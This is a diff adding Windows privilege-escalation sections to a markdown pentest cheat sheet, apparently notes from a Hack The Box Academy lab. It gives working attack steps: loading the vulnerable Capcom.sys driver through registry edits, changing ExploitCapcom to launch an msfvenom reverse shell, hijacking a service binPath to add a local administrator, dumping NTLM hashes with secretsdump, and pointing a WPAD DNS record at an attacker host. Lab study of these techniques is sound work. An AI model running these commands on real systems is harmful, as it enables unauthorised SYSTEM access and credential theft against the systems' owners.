@@ -3083,6 +3083,7 @@ These protocols are quite vulnerable to hijacking, and any domain user can creat
 | --- | --- |
 |`Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`|Disable WPAD Query Block list |
 |`Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`|Add a WPAD record point to attacker controlled machine|
+
 ---
 
 ##### Hyper-V Administrators 
@@ -3097,6 +3098,72 @@ It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-
 |`takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`| Take ownership of file 
 |`sc.exe start MozillaMaintenance`| Start malicious service |
 |Hardlink has been mitigated by March 2020 Windows security update||
+|[Hyper-V Exploitation Resources](https://github.com/shogunlab/awesome-hyper-v-exploitation)||
+
+---
+
+##### Print Operators 
+
+Print Operators is another highly privileged group, which grants its members the SeLoadDriverPrivilege, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.
+Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".
+
+
+| **Command** | **Description** |
+| --- | --- |
+|`whoami /priv`| Check priv|
+|[UAC Bypass](https://github.com/hfiref0x/UACME)| UAC Bypass list needed to enable SeLoadDriverPrivilege|
+|[Printer DLL POC](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)||
+
+Edit the DLL to include the following C code then compile using VSCode using cl.exe
+
+```
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <stdio.h>
+#include "tchar.h"
+```
+| **Command** | **Description** |
+| --- | --- |
+|`cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`| Compile using cl|
+|[Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)| Download Capcom driver to C:\temp|
+|` reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`|Add reference to Capcom driver to HKEY_CURRENT_USER within registry|
+|`reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`| Create new DWORD enabling driver|
+|`.\DriverView.exe /stext drivers.txt`| Check if driver is loaded using [Driverview](http://www.nirsoft.net/utils/driverview.html) |
+|`cat drivers.txt \| Select-String -pattern Capcom`| Check output looking for Capcom|
+|`EnableSeLoadDriverPrivilege.exe`| Enable SeLoadDriverPrivilege|
+|[ExploitCapcom](https://github.com/tandasat/ExploitCapcom)| Tool used to exploit Capcom.sys which launches shell with SYSTEM priv|
+
+If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace "C:\\Windows\\system32\\cmd.exe" with, say, a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe.
+
+```
+ TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
+```
+We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver.
+
+```
+EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+```
+
+##### Server Operators
+
+The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
+
+Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.
+
+| **Command** | **Description** |
+| --- | --- |
+|`sc qc AppReadiness`| Get details on service using sc|
+|`c:\Tools\PsService.exe security AppReadiness`| Get details of service using  PSService |
+|`net localgroup Administrators`| Check local group|
+|`sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`| Change AppReadiness Service Binary to execute a command. In this case adding account to Administrators local group|
+|`sc start AppReadiness`| Start modified service|
+|`net localgroup Administrators`| Should now be part of the group|
+|`crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'`| Use crackmapexec to perform activity|
+|`secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator`|Retrieve NTLM Password hashes using secretsdump.py|
+
+
 
 ### Handy Commands
 
